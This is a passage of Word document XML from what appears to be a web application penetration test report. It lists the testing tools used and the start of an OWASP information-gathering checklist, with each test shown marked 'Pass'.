              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FBB6548" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Software: notepad++, sublime, python, RDP, putty</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="7F5783A2" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="288"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="377" w:type="pct"/>
            <w:vMerge w:val="restart"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F0E4198" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t> 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:vMerge w:val="restart"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30F72149" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Commercial tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13C4C8C9" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">Burpsuite – </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Proxy for application scanning, analyzing and modifying requests, responses</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="690F0C66" w14:textId="77777777" w:rsidTr="00AA446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7" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B61DC08" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5442F440" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27A110D2" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">Nessus - </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Vulnerability scanner for servers, databases, applications and network devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="4EBE3AD6" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="3010"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="377" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="015B832B" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t> 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EC3C17E" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Self-developed tools</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> (HPT)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26E2D372" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="003A3EC4" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>HPT Scanner &amp; Tool</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Analyzing application structure</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Enumerate application components</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>functions</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">, url, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>parameters</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>,</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> …</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t>-</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> Password dictionary and signs of critical vulnerabilities, for example XSS, SQL based on errors</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D68521" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Sensitive components detection</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> (GHDB, Module, keyword,</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameters</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>contents</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">, email, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>notes</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>, backup dat</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>a, …</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Customized exploit for critical vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>: SQL Injection, XSS, Heartbleed, XPath, XXE, File Upload, File Inclusion, OS Command Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">, … and others vulnerabilities in and out of </w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">OWASP Top 10 </w:t>
            </w:r>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">- </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Customization support for web service</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72E3FEDA" w14:textId="77777777" w:rsidR="00DD3157" w:rsidRDefault="00B35DAE" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc34146507"/>
      <w:r>
        <w:t xml:space="preserve">LIST OF </w:t>
      </w:r>
      <w:r w:rsidR="00CE40CA">
        <w:t>OWASP</w:t>
      </w:r>
      <w:r w:rsidR="00D77876">
        <w:t xml:space="preserve"> TESTCASE</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
      <w:r w:rsidR="004B1C9E">
        <w:t>S</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent110"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1838"/>
        <w:gridCol w:w="6237"/>
        <w:gridCol w:w="1272"/>
      </w:tblGrid>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00AD7173" w14:paraId="7B91FF81" w14:textId="77777777" w:rsidTr="0001157D">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2FB4EC9B" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4AE5B014" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>TESTCASE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68A0CAD3" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>RESULT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00193939" w14:paraId="5A6FF9D9"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val="restart"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2B03E58F" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:r w:rsidRPr="009D52CD">
              <w:t>Information Gathering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F8A75CA"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3E33F4">
              <w:t>Conduct Search Engine Discovery and Reconnaissance for Information Leakage (OTG-INFO-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="0DD5B43B" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00193939" w14:paraId="7030EDCB"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="14D0DF70" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C188ADB"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3E33F4">
              <w:t>Fingerprint Web Server (OTG-INFO-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4493ABC1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00193939" w14:paraId="6B00AB97"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="201F670E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FC1438C"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3E33F4">
              <w:t>Review Webserver Metafiles for Information Leakage (OTG-INFO-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="64494C4A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00193939" w14:paraId="076D108B"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="13C3B19A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55810A3B"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3E33F4">
              <w:t>Enumerate Applications on Webserver (OTG-INFO-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5272567E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00193939" w14:paraId="2F1E91A9"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7E206621" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3BFB04B0"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3E33F4">
              <w:t xml:space="preserve">Review Webpage Comments and Metadata for Information </w:t>
            </w:r>
            <w:r w:rsidRPr="003E33F4">
              <w:lastRenderedPageBreak/>
              <w:t>Leakage (OTG-INFO-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="27EFA1CA" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00193939" w14:paraId="3E362934"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="42C6BA9D" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5CF1F80B"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3E33F4">
              <w:t>Identify application entry points (OTG-INFO-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="49C5A420" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00193939" w14:paraId="2FC18ADB"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3ED797F7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FEDC408"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3E33F4">
              <w:t>Map execution paths through application (OTG-INFO-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="0F8656ED" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00193939" w14:paraId="11E25D82"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2EF8B559" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1651DD3E"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3E33F4">
              <w:t>Fingerprint Web Application Framework (OTG-INFO-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
